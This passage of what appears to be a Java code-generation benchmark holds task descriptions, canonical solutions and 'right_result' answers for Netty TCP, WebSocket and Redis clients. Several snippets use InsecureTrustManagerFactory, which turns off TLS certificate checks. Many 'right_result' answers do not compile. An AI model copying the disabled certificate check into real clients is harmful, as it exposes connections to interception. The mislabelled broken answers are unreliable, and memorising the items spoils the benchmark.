     ChannelPipeline pipeline = ch.pipeline();\n                        if (sslContext != null) {\n                            pipeline.addLast(sslContext.newHandler(ch.alloc(), host, port));\n                        }\n                        pipeline.addLast(\n                                new HttpClientCodec(),\n                                new HttpObjectAggregator(8192),\n                                new IdleStateHandler(\n                                        options.getAutoPingInterval() + options.getAutoPingTimeout(),\n                                        options.getAutoPingInterval(), 0, TimeUnit.SECONDS),\n                                mHandler);\n                    }\n                });\n\n        ChannelFuture f = bootstrap.connect(uri.getHost(), port);\n        f.addListener((ChannelFutureListener) connectFuture -> {\n            if (connectFuture.cause() != null) {\n                transportHandler.onDisconnect(false);\n            } else {\n                mChannel = f.channel();\n            }\n        });\n    }\n\n    @Override\n    public void send(byte[] payload, boolean isBinary) {\n        WebSocketFrame frame = isBinary ?\n                new BinaryWebSocketFrame(toByteBuf(payload)) :\n                new TextWebSocketFrame(toByteBuf(payload));\n        mChannel.writeAndFlush(frame);\n    }\n\n    @Override\n    public boolean isOpen() {\n        return mChannel != null && mChannel.isOpen();\n    }\n\n    @Override\n    public void close() throws Exception {\n        if (mHandler != null && mChannel != null) {\n            mHandler.close(mChannel, true, new CloseDetails(CloseDetails.REASON_DEFAULT, null));\n        }\n        if (mGroup != null) {\n            mGroup.shutdownGracefully().sync();\n            mGroup = null;\n        }\n    }\n\n    private int validateURIAndGetPort(URI uri) {\n        String scheme = uri.getScheme();\n        if (!\"ws\".equalsIgnoreCase(scheme) && !\"wss\".equalsIgnoreCase(scheme)) {\n            throw new IllegalArgumentException(\"Only WS(S) is supported.\");\n        }\n        int port = uri.getPort();\n        if (port == -1) {\n            port = \"ws\".equalsIgnoreCase(scheme) ? 80 : 443;\n        }\n        return port;\n    }\n\n    private SslContext getSSLContext(String scheme) throws SSLException {\n        return \"wss\".equalsIgnoreCase(scheme) ?\n                SslContextBuilder.forClient().trustManager(InsecureTrustManagerFactory.INSTANCE).build() :\n                null;\n    }\n\n    private ByteBuf toByteBuf(byte[] bytes) {\n        return Unpooled.copiedBuffer(bytes);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class NettyWebSocket implements ITransport {\n    private Channel mChannel;\n    private NettyWebSocketClientHandler mHandler;\n    private NioEventLoopGroup mGroup;\n    private String mUri;\n    private WebSocketOptions mOptions;\n\n    public void connect(ITransportHandler transportHandler, TransportOptions options) throws Exception {\n        mUri = options.getUri();\n        mOptions = new WebSocketOptions(options);\n        mGroup = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(mGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline p = ch.pipeline();\n                        SslContext sslCtx = getSSLContext(mUri);\n                        if (sslCtx != null) {\n                            p.addLast(sslCtx.newHandler(ch.alloc(), mUri.split(\":\")[1]));\n                        }\n                        p.addLast(new HttpClientCodec());\n                        p.addLast(new HttpObjectAggregator(8192));\n                        p.addLast(mHandler = new NettyWebSocketClientHandler(transportHandler, mOptions));\n                    }\n                });\n        ChannelFuture f = b.connect(mUri.split(\":\")[1]).sync();\n        mChannel = f.channel();\n    }\n\n    public void send(byte[] payload, boolean isBinary) {\n        if (mChannel != null && mChannel.isActive()) {\n            ByteBuf buf = toByteBuf(payload);\n            if (isBinary) {\n                mChannel.writeAndFlush(new BinaryWebSocketFrame(buf));\n            } else {\n                mChannel.writeAndFlush(new TextWebSocketFrame(buf.toString(CharsetUtil.UTF_8)));\n            }\n        }\n    }\n\n    public boolean isOpen() {\n        return mChannel != null && mChannel.isActive();\n    }\n\n    public void close() throws Exception {\n        if (mChannel != null) {\n            mChannel.close().sync();\n        }\n        if (mGroup != null) {\n            mGroup.shutdownGracefully();\n        }\n    }\n\n    private int validateURIAndGetPort(URI uri) {\n        // Implementation of URI validation and port determination\n    }\n\n    private SslContext getSSLContext(String scheme) {\n        if (\"wss\".equals(scheme)) {\n            try {\n                return SslContextBuilder.forClient()\n                        .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                        .build();\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to create SSL context\", e);\n            }\n        }\n        return null;\n    }\n\n    private ByteBuf toByteBuf(byte[] bytes) {\n        return Unpooled.wrappedBuffer(bytes);\n    }\n}\n```"
  },
  {
    "Task_id": 125,
    "Instruction": "Task Description: Create a Java class that manages TCP client connections using Netty framework, handling connection establishment, error handling, and resource cleanup.\n\nClass Description: NetService is a connection management class that maintains and reuses TCP connections to remote locations using Netty's non-blocking I/O. It provides thread-safe connection pooling and handles connection lifecycle including handshake, authentication, and graceful shutdown.\n\nAttributes:\n- connections: ConcurrentHashMap<Location, Connection> - Thread-safe map storing active connections keyed by remote location\n\nMethods:\n- connect(Location location) -> Connection - Establishes or reuses a TCP connection to the specified location. Handles connection initialization, handshake, and authentication. Returns the established connection.\n  Input: \n    - location: Location - The remote endpoint to connect to\n  Output: \n    - Connection - The established or existing connection object\n\nThe implementation should:\n1. Use Netty's Bootstrap for client configuration\n2. Employ NioEventLoopGroup for I/O thread management\n3. Configure TCP_NODELAY for low-latency communication\n4. Handle connection errors and interruptions\n5. Implement connection pooling with automatic cleanup\n6. Support connection handshake and authentication\n7. Provide graceful shutdown of resources\n8. Maintain thread safety through ConcurrentHashMap",
    "Canonical_solution": "import io.dingodb.common.Location;\nimport io.dingodb.net.NetError;\nimport io.dingodb.net.netty.Constant;\nimport io.dingodb.net.netty.connection.Connection;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\nimport static io.dingodb.common.concurrent.Executors.executor;\nimport static io.dingodb.common.util.Optional.ifPresent;\n\n@Slf4j\npublic class NetService {\n\n    private final Map<Location, Connection> connections = new ConcurrentHashMap<>(8);\n\n    private Connection connect(Location location) {\n        return connections.computeIfAbsent(location, k -> {\n            Optional<Connection> connection = Optional.empty();\n            NioEventLoopGroup executor = new NioEventLoopGroup(0, executor(location.url() + \"/connection\"));\n            try {\n                Bootstrap bootstrap = new Bootstrap();\n                bootstrap\n                    .channel(NioSocketChannel.class)\n                    .group(executor)\n                    .option(ChannelOption.TCP_NODELAY, true)\n                    .remoteAddress(location.toSocketAddress())\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            connection.ifAbsentSet(new Connection(Constant.CLIENT, location, ch));\n                            NettyHandlers.initChannelPipeline(ch, connection.get());\n                        }\n                    });\n                bootstrap.connect().sync().await();\n                connection\n                    .ifPresent(Connection::handshake).ifPresent(Connection::auth)\n                    .ifPresent(() -> log.info(\"Connection open, remote: [{}].\", location))\n                    .orElseThrow(() -> new NullPointerException(\"connection\"));\n            } catch (InterruptedException e) {\n                log.error(\"Open connection to [{}] interrupted.\", location, e);\n                connection.ifPresent(Connection::close);\n                executor.shutdownGracefully();\n                NetError.OPEN_CONNECTION_INTERRUPT.throwFormatError(location);\n            } catch (Exception e) {\n                log.error(\"Open connection to [{}] error.\", location, e);\n                connection.ifPresent(Connection::close);\n                executor.shutdownGracefully();\n                throw e;\n            }\n            connection.get().addCloseListener(__ -> executor.shutdownGracefully());\n            connection.ifPresent(__ -> __.addCloseListener(___ -> connections.remove(location, __)));\n            connection.ifPresent(__ -> __.socket().closeFuture().addListener(ignore -> __.close()));\n            return connection.get();\n        });\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class NetService {\n    private final ConcurrentHashMap<Location, Connection> connections = new ConcurrentHashMap<>();\n    private final EventLoopGroup group = new NioEventLoopGroup();\n\n    public Connection connect(Location location) throws Exception {\n        return connections.computeIfAbsent(location, loc -> {\n            try {\n                Bootstrap b = new Bootstrap();\n                b.group(group)\n                 .channel(NioSocketChannel.class)\n                 .option(ChannelOption.TCP_NODELAY, true)\n                 .handler(new ChannelInitializer<SocketChannel>() {\n                     @Override\n                     protected void initChannel(SocketChannel ch) throws Exception {\n                         ChannelPipeline p = ch.pipeline();\n                         // Add necessary handlers here for handshake and authentication\n                         p.addLast(new HandshakeHandler());\n                         p.addLast(new AuthenticationHandler());\n                     }\n                 });\n\n                ChannelFuture f = b.connect(loc.getAddress(), loc.getPort()).sync();\n                return new Connection(f.channel());\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to connect to \" + loc, e);\n            }\n        });\n    }\n\n    public void shutdown() {\n        connections.values().forEach(Connection::close);\n        group.shutdownGracefully();\n    }\n\n    static class Connection {\n        private final Channel channel;\n\n        public Connection(Channel channel) {\n            this.channel = channel;\n        }\n\n        public void close() {\n            if (!channel.isClosed()) {\n                channel.closeNow();\n            }\n        }\n    }\n\n    static class Location {\n        private final String address;\n        private final int port;\n\n        public Location(String address, int port) {\n            this.address = address;\n            this.port = port;\n        }\n\n        public InetSocketAddress getAddress() {\n            return new InetSocketAddress(address, port);\n        }\n    }\n\n    static class HandshakeHandler extends SimpleChannelInboundHandler<Void> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Void msg) throws Exception {\n            // Handle handshake logic here\n        }\n    }\n\n    static class AuthenticationHandler extends SimpleChannelInboundHandler<Void> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Void msg) throws Exception {\n            // Handle authentication logic here\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 126,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a server, send requests, and receive responses, with optional SSL support.\n\nClass Description: FactorialClient is a Netty-based TCP client that connects to a server to calculate factorials. It handles SSL configuration, connection management, and graceful shutdown of resources.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be used\n- HOST: String - The host address of the server to connect to (default: \"127.0.0.1\")\n- PORT: int - The port number of the server (default: 8322)\n- COUNT: int - The number for which factorial should be calculated (default: 1000)\n\nMethods:\n- start(): void - Initializes and starts the Netty client. Configures SSL if enabled, establishes connection to server, and handles the factorial calculation request. Throws Exception if any error occurs during the process.\n  - Input: None\n  - Output: None (prints result to System.err)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class FactorialClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n    static final int COUNT = Integer.parseInt(System.getProperty(\"count\", \"1000\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new FactorialClientInitializer(sslCtx));\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n\n            FactorialClientHandler handler =\n                (FactorialClientHandler) f.channel().pipeline().last();\n\n            System.err.format(\"Factorial of %,d is: %,d\", COUNT, handler.getFactorial());\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class FactorialClient {\n    private final boolean SSL = true;\n    private final String HOST = \"127.0.0.1\";\n    private final int PORT = 8322;\n    private final int COUNT = 1000;\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            SslContext sslCtx = null;\n            if (SSL) {\n                sslCtx = SslContextBuilder.forClient()\n                        .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n            }\n\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new FactorialClientHandler(COUNT));\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        new FactorialClient().start();\n    }\n}\n\nclass FactorialClientHandler extends SimpleChannelInboundHandler<String> {\n    private final int count;\n\n    public FactorialClientHandler(int count) {\n        this.count = count;\n    }\n\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        System.err.println(\"Factorial of \" + count + \": \" + msg);\n        ctx.close();\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 127,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for establishing non-blocking network connections to a remote server.\n\nClass Description: The NettyTcpClient class provides functionality to create and manage TCP client connections using Netty's asynchronous event-driven network framework. It handles connection establishment, pipeline configuration, and resource cleanup.\n\nAttributes:\n- eventLoopGroup: [NioEventLoopGroup] - Manages the event processing threads for the client\n- bootstrap: [Bootstrap] - The main configuration object for the Netty client\n\nMethods:\n- NettyTcpClient(): [Constructor] -> [void] - Initializes the client with a new NioEventLoopGroup and Bootstrap instance\n- configureBootstrap(): [void]() -> [void] - Configures the bootstrap with channel type and event loop group\n- connect(int port, String host, Consumer<Connection> handler): [ChannelFuture](int, String, Consumer<Connection>) -> [ChannelFuture] - Establishes a connection to the specified host and port, allowing for pipeline configuration via the handler\n- shutdown(): [void]() -> [void] - Shuts down the event loop group gracefully to release resources\n\nNested Class:\n- Connection: [static class] - Represents an established connection with channel and HTTP/2 components\n  Attributes:\n    - channel: [Channel] - The network channel\n    - context: [ChannelHandlerContext] - The handler context\n    - connection: [Http2Connection] - HTTP/2 connection object\n    - encoder: [Http2ConnectionEncoder] - HTTP/2 encoder\n    - decoder: [Http2ConnectionDecoder] - HTTP/2 decoder\n  Methods:\n    - Connection(ChannelHandlerContext, Http2Connection, Http2ConnectionEncoder, Http2ConnectionDecoder): [Constructor] -> [void] - Creates a new connection instance\n    - nextStreamId(): [int]() -> [int] - Gets the next available stream ID for HTTP/2 communication",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.function.Consumer;\n\npublic class NettyTcpClient {\n\n    private final NioEventLoopGroup eventLoopGroup;\n    private final Bootstrap bootstrap;\n\n    public NettyTcpClient() {\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        configureBootstrap();\n    }\n\n    private void configureBootstrap() {\n        bootstrap.channel(NioSocketChannel.class)\n                .group(eventLoopGroup);\n    }\n\n    public ChannelFuture connect(int port, String host, Consumer<Connection> handler) {\n        bootstrap.handler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n                // Configure client pipeline here\n                // Add encoders, decoders and custom handlers\n            }\n        });\n        return bootstrap.connect(new InetSocketAddress(host, port));\n    }\n\n    public void shutdown() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    public static class Connection {\n        public final Channel channel;\n        public final ChannelHandlerContext context;\n        public final Http2Connection connection;\n        public final Http2ConnectionEncoder encoder;\n        public final Http2ConnectionDecoder decoder;\n\n        public Connection(ChannelHandlerContext context, Http2Connection connection, \n                         Http2ConnectionEncoder encoder, Http2ConnectionDecoder decoder) {\n            this.channel = context.channel();\n            this.context = context;\n            this.connection = connection;\n            this.encoder = encoder;\n            this.decoder = decoder;\n        }\n\n        public int nextStreamId() {\n            return connection.local().incrementAndGetNextStreamId();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http2.Http2Connection;\nimport io.netty.handler.codec.http2.Http2ConnectionEncoder;\nimport io.netty.handler.codec.http2.Http2ConnectionDecoder;\nimport io.netty.handler.codec.http2.Http2FrameCodecBuilder;\n\nimport java.util.function.Consumer;\n\npublic class NettyTcpClient {\n    private final EventLoopGroup eventLoopGroup = new NioEventLoopGroup();\n    private final Bootstrap bootstrap = new Bootstrap();\n\n    public NettyTcpClient() {\n        configureBootstrap();\n    }\n\n    private void configureBootstrap() {\n        bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class);\n    }\n\n    public ChannelFuture connect(int port, String host, Consumer<Connection> handler) throws InterruptedException {\n        return bootstrap.connect(host, port).addListener(future -> {\n            if (future.isSuccess()) {\n                Channel channel = future.channel();\n                Http2FrameCodecBuilder codecBuilder = Http2FrameCodecBuilder.forClient().build();\n                Http2ConnectionEncoder encoder = codecBuilder.newEncoder();\n                Http2ConnectionDecoder decoder = codecBuilder.newDecoder();\n                Http2Connection connection = new DefaultHttp2Connection(true);\n                decoder.connection(connection);\n                channel.pipeline().addLast(encoder, decoder);\n                handler.accept(new Connection(channel.pipeline().context(decoder), connection, encoder, decoder));\n            } else {\n                future.cause().printStackTrace();\n            }\n        });\n    }\n\n    public void shutdown() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    public static class Connection {\n        private final ChannelHandlerContext context;\n        private final Http2Connection connection;\n        private final Http2ConnectionEncoder encoder;\n        private final Http2ConnectionDecoder decoder;\n\n        public Connection(ChannelHandlerContext context, Http2Connection connection, Http2ConnectionEncoder encoder, Http2ConnectionDecoder decoder) {\n            this.context = context;\n            this.connection = connection;\n            this.encoder = encoder;\n            this.decoder = decoder;\n        }\n\n        public int nextStreamId() {\n            return connection.local().nextStreamId();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 128,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish non-blocking connections to a remote server, handle message processing through a configurable pipeline, and ensure proper resource cleanup.\n\nClass Description: The MocoClient class provides a reusable TCP client implementation using Netty's non-blocking I/O capabilities. It manages connection lifecycle, channel configuration, and graceful shutdown of network resources.\n\nAttributes:\n- None (This is a stateless client implementation where all configuration is passed through method parameters)\n\nMethods:\n- run(String host, int port, ChannelHandler pipelineFactory) -> void - Main method that initializes and runs the Netty client. It takes the server host address, port number, and a pipeline factory for configuring message handlers. The method establishes the connection, waits for it to close, and ensures proper resource cleanup. Throws MocoException if interrupted during operation.\n\nThe method performs these key operations:\n1. Creates NioEventLoopGroup for I/O thread management\n2. Configures Bootstrap with NioSocketChannel and connection parameters\n3. Sets TCP_NODELAY option for low-latency communication\n4. Applies the provided pipeline factory for message handling\n5. Establishes connection and waits for channel closure\n6. Implements graceful shutdown in finally block",
    "Canonical_solution": "import com.github.dreamhead.moco.MocoException;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class MocoClient {\n    public final void run(final String host, final int port, final ChannelHandler pipelineFactory) {\n        EventLoopGroup group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(host, port)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(pipelineFactory);\n\n        try {\n            Channel channel = bootstrap.connect().sync().channel();\n            ChannelFuture future = channel.closeFuture().sync();\n            future.addListener(ChannelFutureListener.CLOSE);\n        } catch (InterruptedException e) {\n            throw new MocoException(e);\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class MocoClient {\n\n    public static void run(String host, int port, ChannelHandler pipelineFactory) throws MocoException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.TCP_NODELAY, true)\n             .handler(pipelineFactory);\n\n            ChannelFuture f = b.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            throw new MocoException(\"Interrupted while running MocoClient\", e);\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 129,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish non-blocking connections, send messages to a server, and handle graceful shutdown.\n\nClass Description: The EchoClient class provides functionality to connect to a TCP server, send messages, and manage client resources. It uses Netty's non-blocking I/O for efficient communication.\n\nAttributes:\n- hostName: [String] - The hostname or IP address of the server to connect to\n- portNumber: [int] - The port number of the server to connect to\n- group: [EventLoopGroup] - Netty event loop group for managing I/O threads\n- channel: [Channel] - The active network channel for communication with the server\n\nMethods:\n- connect(): [void] - Establishes a connection to the specified server using Netty's Bootstrap. Initializes the event loop group and configures the client pipeline.\n- sendMessage(message: [String]): [void] - Converts the input string to a ByteBuf and sends it to the connected server through the active channel.\n- startConsoleInput(): [void] - Reads input from the console and sends it to the server line by line until terminated. Handles IO exceptions.\n- shutdown(): [void] - Gracefully shuts down the event loop group and releases all resources. Should be called when the client is no longer needed.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\n\npublic final class EchoClient {\n\n    private final String hostName;\n    private final int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.TCP_NODELAY, true)\n         .handler(new EchoClientHandler());\n\n        ChannelFuture f = b.connect(hostName, portNumber).sync();\n        channel = f.channel();\n    }\n\n    public void sendMessage(String message) {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        writeBuffer.rewind();\n        \n        ByteBuf buf = Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(buf);\n        writeBuffer.clear();\n    }\n\n    public void startConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + hostName);\n            System.exit(1);\n        } catch (IOException e) {\n            System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + hostName);\n            System.exit(1);\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class EchoClient {\n    private String hostName;\n    private int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() throws Exception {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {\n                         @Override\n                         protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) throws Exception {\n                             System.out.print(msg.toString(io.netty.util.CharsetUtil.UTF_8));\n                         }\n                     });\n                 }\n             });\n\n            channel = b.connect(hostName, portNumber).sync().channel();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void sendMessage(String message) {\n        if (channel != null && channel.isActive()) {\n            ByteBuf buf = Unpooled.copiedBuffer(message + \"\\n\", io.netty.util.CharsetUtil.UTF_8);\n            channel.writeAndFlush(buf);\n        }\n    }\n\n    public void startConsoleInput() {\n        try (Scanner scanner = new Scanner(System.in)) {\n            while (true) {\n                System.out.print(\"Enter message: \");\n                sendMessage(scanner.nextLine());\n            }\n        } catch (Exception e) {\n            System.err.println(\"Error reading from console: \" + e.getMessage());\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.closeFuture().syncUninterruptibly();\n        }\n        group.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 130,
    "Instruction": "Task Description: Create a Java class that implements a Redis client using Netty framework for TCP communication, capable of sending Redis commands and receiving responses.\n\nClass Description: The RedisClient class establishes a non-blocking TCP connection to a Redis server using Netty's NIO framework. It handles command input from the user, sends commands to the Redis server, and manages connection lifecycle including graceful shutdown.\n\nAttributes:\n- HOST: [String] - The Redis server host address (default: \"127.0.0.1\")\n- PORT: [int] - The Redis server port number (default: 6379)\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - The active network channel for communication\n- lastWriteFuture: [ChannelFuture] - Tracks the last write operation to the server\n\nMethods:\n- start(): [void] - Initializes the Netty client, establishes connection to Redis server, and starts command input loop\n- stop(): [void] - Closes the connection and shuts down the client gracefully\n- initChannel(SocketChannel ch): [void] - Configures the channel pipeline with Redis codecs and handlers (internal method)",
